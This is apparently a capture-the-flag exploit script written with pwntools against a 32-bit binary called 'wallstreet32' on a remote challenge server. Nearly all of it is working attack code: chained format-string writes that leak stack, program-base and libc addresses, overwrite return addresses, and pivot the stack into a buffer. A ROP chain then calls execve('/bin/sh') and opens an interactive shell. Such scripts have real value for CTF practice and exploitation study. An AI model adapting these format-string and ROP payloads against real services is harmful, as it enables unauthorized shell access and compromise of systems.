from pwn import *

#init

e = ELF('./wallstreet32')
libc = ELF('./libc32-2.31.so')

context.binary = e

#p = process(e.path)
p = remote('143.198.127.103', 42006)

#funcs

def fmtchr(x, y):
    y = 1 << (8 * y)
    x = x & (y - 1)
    return '%' + str(x if x != 0 else y) + 'c'

#vars

main = e.sym['main']
fini_array = e.sym['__do_global_dtors_aux_fini_array_entry']
user_buf = e.sym['user_buf']
system_off = libc.sym['execve'] 
binsh_off = next(libc.search(b'/bin/sh'))

log.info('Main adr: ' + hex(main))
log.info('Fini array adr: ' + hex(fini_array))
log.info('User buf adr: ' + hex(user_buf))
log.info('System libc off: ' + hex(system_off))
log.info('Binsh libc off: ' + hex(binsh_off))

#exploit

#just get rid
                         
p.sendlineafter('!', '1')

#print random one

p.sendlineafter('?', '1')

#use copy for magic to return to buy_stonks with base ptr on stk while messing up stonk pointer

s = '%*15$c' #copy pie address
s += '%1$n' #add onto user_buf
s += '%88$n' #add onto base offset
s += fmtchr((main + 227) - (main + 26), 2) #correct lower main offset
s += '%1$hn'
s += fmtchr((user_buf - fini_array) - (main + 227), 2) #correct fake base offset
s += '%88$hn'
s += '#'

p.sendlineafter('?', s)
p.recvuntil('#')

#leak stk since stonk array now pointing somewhere else on stk

p.sendlineafter('?\n', '19')

stk = u32(p.recv(4))

log.info('Stk adr: ' + hex(stk))

#lower byte overwrite return to get another leak, careful with '$' since copies stk

s = '%c' * 10
s += fmtchr(stk - 4 * 1 - 10, 2) #write ptr to return adr
s += '%hn'
s += fmtchr((main + 227) - (stk - 4 * 1), 1) #chg return to call buy_stonks again
s += '%12$hhn'
s += '#'

p.sendlineafter('?', s)
p.recvuntil('#')

#leak pie base

p.sendlineafter('?\n', '19')

base = u32(p.recv(4)) - (main + 227)

log.info('Base adr: ' + hex(base))

#lower byte overwrite return to get another leak again, along with creating more stk ptrs

s = '%c' * 10
s += fmtchr(stk - 4 * 5 - 10, 2) #write ptr to return adr
s += '%hn'
s += fmtchr((main + 227) - (stk - 4 * 5), 1) #chg return to call buy_stonks again
s += '%16$hhn'
s += '#'

p.sendlineafter('?', s)
p.recvuntil('#')

#leak libc off

p.sendlineafter('?\n', '9')

libc_off = u32(p.recv(4)) - 0x1e6a28

log.info('Libc off adr: ' + hex(libc_off))

#overwrite eventual esp value on stk to pivot to user_buf to rop system('/bin/sh')

s = '%c' * 10
s += fmtchr((stk + 4 * 29) - 10, 2) #write ptr to esp lower
s += '%hn'
s += '%c' * 2
s += fmtchr((stk + 4 * 29 + 2) - (stk + 4 * 29) - 2, 2) #write ptr to esp upper
s += '%hn'
s += fmtchr((base + user_buf + 0x104) - (stk + 4 * 29 + 2), 2) #write user_buf lower
s += '%10$hn'
s += fmtchr(((base + user_buf + 0x104) >> 16) - (base + user_buf + 0x104), 2) #write user_buf upper
s += '%20$hn'
s += fmtchr((stk + 4 * 31) - ((base + user_buf + 0x104) >> 16), 2) #make leave ptr correct
s += '%12$hn'
s += '#'
s = s.encode().ljust(0x100, b'\x00')
s += p32(libc_off + system_off) #rop chain
s += p32(0)
s += p32(libc_off + binsh_off)
s += p32(0) * 2

p.sendlineafter('?', s)
p.recvuntil('#')

#pray for flag

p.interactive()
